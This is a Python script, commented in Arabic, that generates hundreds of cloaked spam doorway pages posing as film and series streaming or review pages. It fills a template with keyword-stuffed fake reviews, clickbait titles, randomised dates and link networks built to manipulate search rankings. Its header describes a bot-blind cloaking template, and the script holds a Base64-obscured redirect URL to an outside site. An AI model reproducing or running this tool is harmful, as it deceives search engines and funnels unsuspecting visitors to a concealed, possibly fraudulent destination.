import os
import random
import string
import re
import base64
from datetime import datetime, timedelta

# ==============================================================================
# GENERATOR PRO - CINEMA & CLOAKING EDITION (2026)
# ==============================================================================
# - Intelligent Keyword Content: Simulates review paragraphs.
# - Silo Internal Linking: Grouping similar content for SEO Authority.
# - Cloaking Ready: Injects data into the bot-blind redirection template.
# ==============================================================================

class ContinuousGenerator:
    def __init__(self):
        self.templates = {}
        # القوالب التي يجب أن تكون موجودة في مجلد العمل
        self.template_names = ["test.html"] 
        self.keywords_ar = []
        self.keywords_en = []
        self.max_files_per_folder = 400
        self.emojis = ["🔥", "🎥", "🎬", "📺", "✅", "🌟", "✨", "💎", "⚡", "🍿"]
        
        # رابط التحويل النهائي (مغلق بـ Base64 لزيادة الأمان أثناء التوليد)
        self.target_redirect = "aHR0cHM6Ly9hY2N1bXVsYXRlcmVoZWFyc2VoZWFsaW5nLmNvbS90aWlhYm5iMD9rZXk9NjM1OTA3ODkwZTQwM2E0YTE0Y2U2MTRlZjE0ODI0M2M="

        self.load_all_templates()
        self.load_keywords()
        self.domain = self.load_domain()

    def load_all_templates(self):
        for t_name in self.template_names:
            if os.path.exists(t_name):
                with open(t_name, "r", encoding="utf-8") as f:
                    self.templates[t_name] = f.read()
                print(f"[*] Template {t_name} loaded.")
            else:
                print(f"[!] {t_name} not found!")

    def load_keywords(self):
        if os.path.exists("keywords_ar.txt"):
            with open("keywords_ar.txt", "r", encoding="utf-8") as f:
                self.keywords_ar = [l.strip() for l in f if l.strip()]
        if os.path.exists("keywords_en.txt"):
            with open("keywords_en.txt", "r", encoding="utf-8") as f:
                self.keywords_en = [l.strip() for l in f if l.strip()]

    def load_domain(self):
        if os.path.exists("CNAME"):
            with open("CNAME", "r", encoding="utf-8") as f:
                return f.read().strip().replace("https://", "").replace("http://", "")
        return "example.org"

    def generate_smart_description(self, main_keyword):
        """توليد وصف يبدو كأنه مراجعة حقيقية للبوت"""
        intro = [
            f"نقدم لكم اليوم تغطية حصرية حول {main_keyword}، حيث نناقش أدق التفاصيل.",
            f"يعتبر {main_keyword} من أهم الأعمال التي تصدرت الترند في الآونة الأخيرة.",
            f"تحليل شامل ومراجعة نقدية لعمل {main_keyword} المتوفر حالياً في أرشيفنا."
        ]
        
        body_words = random.sample(self.keywords_ar, min(15, len(self.keywords_ar)))
        body_text = " ".join(body_words)
        
        conclusion = [
            f"تابعوا معنا كل جديد حول {main_keyword} عبر منصتنا الموثقة.",
            f"لا تنسوا مشاهدة باقي الحلقات المرتبطة بـ {main_keyword} في الأسفل.",
            f"إنتاج وحدة التوثيق الرقمي لعام 2026 يضمن لكم جودة فائقة لـ {main_keyword}."
        ]
        
        return f"{random.choice(intro)} {body_text}. {random.choice(conclusion)}"

    def get_target_path(self, total_count):
        paths = []
        files_remaining = total_count
        while files_remaining > 0:
            d1 = random.choice(["watch", "cinema", "show", "series", "archive"])
            d2 = ''.join(random.choices(string.ascii_lowercase, k=4))
            full_path = os.path.join(d1, d2)
            os.makedirs(full_path, exist_ok=True)
            paths.append(full_path)
            files_remaining -= self.max_files_per_folder
        return paths

    def build_internal_links(self, current_index, generated_files):
        """بناء شبكة ربط داخلي تعتمد على العناقيد (Clusters)"""
        selected_links = []
        # روابط من نفس المجلد (Silo)
        same_folder = [f for idx, f in enumerate(generated_files) 
                       if f["folder"] == generated_files[current_index]["folder"] and idx != current_index]
        random.shuffle(same_folder)
        selected_links.extend(same_folder[:6])

        # روابط عشوائية للعموم
        others = [f for f in generated_files if f not in selected_links]
        random.shuffle(others)
        selected_links.extend(others[:2])

        links_html = ""
        for link in selected_links:
            url = f"https://{self.domain}/{link['folder'].replace(os.sep, '/')}/{link['filename']}"
            links_html += f"""
            <a href='{url}' class='related-item'>
                <div class='thumb-mock'>
                   <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/mqdefault.jpg" style="width:100%; height:100%; object-fit:cover; opacity:0.5;">
                </div>
                <div class='related-info'>{link['display_title']}</div>
            </a>"""
        return links_html

    def run_cycle(self, count=200):
        folder_paths = self.get_target_path(count)
        base_time = datetime.utcnow()
        files_to_create = []

        print(f"[*] Preparing {count} pages data...")
        
        for folder in folder_paths:
            # نوزع العدد الإجمالي على المجلدات المتاحة
            num_to_gen = min(count // len(folder_paths), self.max_files_per_folder)
            
            for _ in range(num_to_gen):
                if not self.keywords_ar: break
                
                raw_keyword = random.choice(self.keywords_ar)
                prefix = random.choice(["مشاهدة", "حصرياً", "فيديو", "مراجعة", "تحليل"])
                display_title = f"{random.choice(self.emojis)} {prefix}: {raw_keyword}"
                
                # إنشاء Slug نظيف
                clean_name = re.sub(r'[^\w\s-]', '', raw_keyword.lower())
                slug = re.sub(r'[-\s]+', '-', clean_name).strip('-')[:70]
                if not slug: slug = ''.join(random.choices(string.digits, k=8))

                files_to_create.append({
                    "display_title": display_title,
                    "filename": f"{slug}-{random.randint(100,999)}.html",
                    "desc": self.generate_smart_description(raw_keyword),
                    "folder": folder,
                    "date_iso": (base_time - timedelta(minutes=random.randint(10, 5000))).strftime("%Y-%m-%dT%H:%M:%S+00:00"),
                    "template": random.choice(self.template_names)
                })

        print(f"[*] Injecting data into {len(files_to_create)} files...")
        
        for i, file_data in enumerate(files_to_create):
            template_content = self.templates.get(file_data['template'], "")
            if not template_content: continue
            
            canonical_url = f"https://{self.domain}/{file_data['folder'].replace(os.sep, '/')}/{file_data['filename']}"
            
            content = template_content
            content = content.replace("{{TITLE}}", file_data['display_title'])
            content = content.replace("{{DESCRIPTION}}", file_data['desc'])
            content = content.replace("{{CANONICAL_URL}}", canonical_url)
            content = content.replace("{{INTERNAL_LINKS}}", self.build_internal_links(i, files_to_create))
            content = content.replace("{{DOMAIN_NAME}}", self.domain)
            content = content.replace("{{DATE}}", file_data['date_iso'])

            target_file = os.path.join(file_data['folder'], file_data['filename'])
            with open(target_file, "w", encoding="utf-8") as f:
                f.write(content)

        print(f"✅ DONE! Created {len(files_to_create)} SEO-optimized pages.")

if __name__ == "__main__":
    generator = ContinuousGenerator()
    # يمكنك زيادة هذا الرقم لإنشاء صفحات أكثر في الدفعة الواحدة
    generator.run_cycle(count=200)